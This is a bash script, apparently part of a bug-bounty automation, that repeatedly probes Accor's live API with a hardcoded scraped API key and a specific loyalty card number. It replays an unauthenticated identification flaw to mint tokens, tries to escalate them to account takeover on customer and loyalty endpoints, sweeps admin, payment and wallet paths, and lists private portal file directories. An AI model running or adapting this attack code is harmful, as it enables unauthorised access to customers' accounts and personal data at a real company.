#!/usr/bin/env bash
# accor-loop.sh — paced recon -> hunt -> validate pass for the ACCOR program (9 in-scope hosts).
# Read-only probes only. Never modifies data. Posts to Discord ONLY on a new confirmation,
# a regression of a delivered finding, or a new takeover candidate. Quiet on a no-change pass.
#
#   accor-loop.sh            one pass
#   accor-loop.sh --status   print state
set -u
ROOT=/root/state/recon/accor
HA=/root/hackbot-architecture
STATE="$ROOT/loop"
FIND="$ROOT/loop/findings.jsonl"
mkdir -p "$STATE"
LOG="$STATE/pass-$(date +%Y%m%d-%H%M).log"
UA_C="curl/8.5.0"                                     # developer.accor.com / api.accor.com
UA_B="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
K="tipXmDlYLY9N5erJtaSGum552l1cQ0YQ"                  # public key shipped in all.accor.com HTML
NEWS=()                                                # lines to post

log(){ echo "[$(date '+%F %T')] $*" | tee -a "$LOG"; }
post(){ NEWS+=("$1"); }

notch(){ # notch <message>
  bash "$HA/notch.sh" "$1" >/dev/null 2>&1 || echo "notch failed"
}

# ---------------------------------------------------------------- 1. regression watch (delivered)
regression_check(){
  log "== 1. regression watch ACC-2026-001"
  code=$(curl -s -o /tmp/l1 -w '%{http_code}' -A "$UA_C" -H "apikey: $K" \
         -H 'Content-Type: application/json' -X POST \
         --data-binary '{"identification":{"cardNumber":"30810312404265AN"}}' \
         -m 25 "https://api.accor.com/availability/v3/identification/plaintext")
  ctrl=$(curl -s -o /tmp/l2 -w '%{http_code}' -A "$UA_C" -H "apikey: $K" \
         -H 'Content-Type: application/json' -X POST \
         --data-binary '{"identification":{"cardNumber":"30810329999999ZL"}}' \
         -m 25 "https://api.accor.com/availability/v3/identification/plaintext")
  log "   live=$code ctrl=$ctrl (expect 201 / 400)"
  if [ "$code" != "201" ]; then
    post "⚠️ ACCOR regression: ACC-2026-001 no longer reproduces (live=$code, control=$ctrl). Re-check /availability/v3/identification/plaintext."
    echo "{\"ts\":\"$(date -Is)\",\"id\":\"ACC-2026-001\",\"event\":\"regression\",\"live\":\"$code\",\"control\":\"$ctrl\"}" >> "$FIND"
  fi
}

# ---------------------------------------------------------------- 2. L1 promotion attempts
lead_token(){
  log "== 2. L1 identificationId promotion attempts"
  tok=$(python3 -c "
import json,subprocess
o=subprocess.run(['curl','-s','-A','$UA_C','-H','apikey: $K','-H','Content-Type: application/json','-X','POST',
 '--data-binary','{\"identification\":{\"cardNumber\":\"30810312404265AN\"}}',
 'https://api.accor.com/availability/v3/identification/plaintext'],capture_output=True,text=True).stdout
try:
    d=json.loads(o); print(d['identification']['identificationId'])
except Exception: print('')" 2>/dev/null)
  [ -z "$tok" ] && { log "   no token minted"; return; }
  log "   token minted: ${tok:0:8}..."
  # header spellings + query param + cookie
  for probe in \
    "https://api.accor.com/customer/v1/contacts/me|-H|Identification: $tok" \
    "https://api.accor.com/customer/v1/contacts/me|-H|identificationId: $tok" \
    "https://api.accor.com/customer/v1/contacts/me|-H|Cookie: identificationId=$tok" \
    "https://api.accor.com/loyalty/v1/members/me|-H|Identification: $tok" \
    "https://api.accor.com/availability/v3/availability?identificationId=$tok||" \
    "https://api.accor.com/availability/v3/identification/plaintext?identificationId=$tok||"; do
    IFS='|' read -r url h1 h2 <<< "$probe"
    args=(-s -o /tmp/lt -w '%{http_code}' -A "$UA_C" -H "apikey: $K" -m 20)
    [ -n "$h1" ] && args+=("$h1")
    [ -n "$h2" ] && args+=("$h2")
    c=$(curl "${args[@]}" "$url")
    body=$(head -c 120 /tmp/lt | tr -d '\n')
    log "   [$c] $url ${h2:+[$h2]} -> $body"
    if [ "$c" = "200" ] || [ "$c" = "201" ]; then
      post "🔥 ACCOR L1 PROMOTED: identificationId minted WITHOUT auth is accepted at $url (HTTP $c). Escalates ACC-2026-001 to ATO-class. Body: $body"
      echo "{\"ts\":\"$(date -Is)\",\"id\":\"ACC-L1\",\"event\":\"promoted\",\"url\":\"$url\",\"code\":\"$c\",\"body\":\"$body\"}" >> "$FIND"
    fi
    sleep 3
  done
}

# ---------------------------------------------------------------- 3. gateway surface sweep
gateway_sweep(){
  log "== 3. api.accor.com base-path sweep with the public key (read-only)"
  for p in /availability/v3/identification/plaintext /catalog/v1/hotels /catalog/v2/hotels \
           /contact-center/v1/contact /contact-center/v2/contact /referential/v1/pos/countries \
           /referential/v1/pos/currencies /latam/v1/plans /ecom/v1/brand-corner/brand-details \
           /customer/v1/contacts/me /loyalty/v1/members/me /authentication/v2.0/refresh \
           /pricing/v1/rates /booking/v1/bookings /reservation/v1/bookings /payment/v1/cards \
           /partner/v1/partners /admin/v1/users /internal/v1/config /referential/v1/hotels \
           /catalog/v1/brands /availability/v3/hotels /loyalty/v1/cards /customer/v1/contacts \
           /bff/meeting-and-events/v1/rest/api/s3-proxy/test /api/hub/sandbox-2/booking/version \
           /api/hub/sandbox-2/search/property/list /wallet/v2/cards/300000012/tokens \
           /payment/v2/referential/cards /loyalty/v1/earn/fnb/TESTTXN/status /ecom/v1/assets; do
    c=$(curl -s -o /tmp/gw -w '%{http_code}' -A "$UA_C" -H "apikey: $K" -m 15 "https://api.accor.com$p")
    # 401/404 = closed/absent. 2xx/400/405/500 = the request reached a backend handler.
    case "$c" in
      200|201|202|400|405|500)
        log "   [OPEN $c] $p -> $(head -c 110 /tmp/gw | tr -d '\n')" ;;
      *) log "   [-- $c] $p" ;;
    esac
    sleep 2
  done
}

# ---------------------------------------------------------------- 4. private-file / portal deltas
portal_delta(){
  log "== 4. developer.accor.com file-system delta"
  for d in 2022-11 2023-01 2024-01 2025-01 2026-01 2026-02 2026-06 2026-10 2026-11; do
    c=$(curl -s -o /tmp/pf -w '%{http_code}' -A "$UA_C" -m 15 "https://developer.accor.com/system/files/$d/")
    log "   [$c] /system/files/$d/ ($(wc -c < /tmp/pf) bytes)"
    sleep 2
  done
}

# ---------------------------------------------------------------- 5. passive takeover delta
takeover_delta(){
  log "== 5. passive CNAME delta (in-scope hosts + subdomains)"
  prev="$STATE/cnames.prev"
  dnsx -d accor.com -d accorhotels.com -cname -resp -silent -t 40 2>/dev/null | sort -u > "$STATE/cnames.now"
  if [ -f "$prev" ]; then
    delta=$(comm -13 "$prev" "$STATE/cnames.now" | head -20)
    if [ -n "$delta" ]; then
      log "   new/changed CNAMEs:"; echo "$delta" | while read -r l; do log "     $l"; done
    else log "   no CNAME delta"; fi
  else log "   baseline recorded"; fi
  cp -f "$STATE/cnames.now" "$prev"
}

# ---------------------------------------------------------------- run
log "=== ACCOR LOOP PASS START ==="
regression_check
lead_token
gateway_sweep
portal_delta
takeover_delta
if [ "${#NEWS[@]}" -gt 0 ]; then
  for m in "${NEWS[@]}"; do notch "$m"; done
  log "posted ${#NEWS[@]} alert(s) to Discord"
else
  log "no change — silent (per convention: channel carries confirmations only)"
fi
log "=== ACCOR LOOP PASS END ==="
